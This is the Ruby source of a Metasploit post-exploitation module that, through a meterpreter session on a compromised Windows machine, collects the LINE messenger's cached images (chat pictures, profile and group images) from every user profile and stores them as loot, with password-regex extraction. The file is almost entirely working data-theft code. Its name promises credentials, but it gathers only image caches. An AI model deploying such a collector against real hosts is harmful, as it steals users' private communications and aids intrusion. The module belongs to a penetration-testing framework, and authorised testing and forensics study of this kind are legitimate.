##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  # this associative array defines the artifacts known to PackRat
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Packrat

  ARTIFACTS =
    {
      application: 'line',
      app_category: 'chats',
      gatherable_artifacts: [
        {
          filetypes: 'images',
          path: 'LocalAppData',
          dir: 'LINE',
          artifact_file_name: '*.png',
          description: 'Image cache with png extension',
          credential_type: 'chat_log'
        },
        {
          filetypes: 'images',
          path: 'LocalAppData',
          dir: 'LINE',
          artifact_file_name: '*.jpeg',
          description: 'Image cache for jpg cache',
          credential_type: 'chat_log'
        },
        {
          filetypes: 'images',
          path: 'LocalAppData',
          dir: 'LINE\\Cache\\p',
          artifact_file_name: '*',
          description: 'Image cache for profile images of users',
          credential_type: 'chat_log'
        },
        {
          filetypes: 'images',
          path: 'LocalAppData',
          dir: 'LINE\\Cache\\g',
          artifact_file_name: '*',
          description: 'Image cache for group icons',
          credential_type: 'chat_log'
        },
        {
          filetypes: 'images',
          path: 'LocalAppData',
          dir: 'LINE\\Cache\\m',
          artifact_file_name: '*',
          description: 'Image cache for images sent through chat',
          credential_type: 'chat_log'
        },
        {
          filetypes: 'images',
          path: 'LocalAppData',
          dir: 'LINE\\Cache\\e',
          artifact_file_name: '*',
          description: 'Image cache for profile images sent by official accounts',
          credential_type: 'chat_log'
        },
        {
          filetypes: 'images',
          path: 'LocalAppData',
          dir: 'LINE\\Data\\pizza',
          artifact_file_name: '*',
          description: 'Image cache for profile images of users',
          credential_type: 'chat_log'
        }
      ]
    }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LINE credential gatherer',
        'Description' => %q{
          PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems.
          PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries.
          Further details can be found in the module documentation.
          This is a module that searches for credentials in LINE desktop application on a windows remote host. LINE is the most popular Instant Messenger app in Japan.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Kazuyoshi Maruta',
          'Daniel Hallsworth',
          'Barwar Salim M',
          'Z. Cliffe Schreuders', # http://z.cliffe.schreuders.org
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptRegexp.new('REGEX', [false, 'Match a regular expression', '^password']),
        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', true]),
        OptBool.new('EXTRACT_DATA', [false, 'Extract data and stores in a separate file', true]),
        # enumerates the options based on the artifacts that are defined below
        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', ARTIFACTS[:gatherable_artifacts].map { |k| k[:filetypes] }.uniq.unshift('All')])
      ]
    )
  end

  def run
    print_status('Filtering based on these selections:  ')
    print_status("ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}")
    print_status("STORE_LOOT: #{datastore['STORE_LOOT']}")
    print_status("EXTRACT_DATA: #{datastore['EXTRACT_DATA']}\n")

    # used to grab files for each user on the remote host
    grab_user_profiles.each do |userprofile|
      run_packrat(userprofile, ARTIFACTS)
    end

    print_status 'PackRat credential sweep Completed'
  end
end
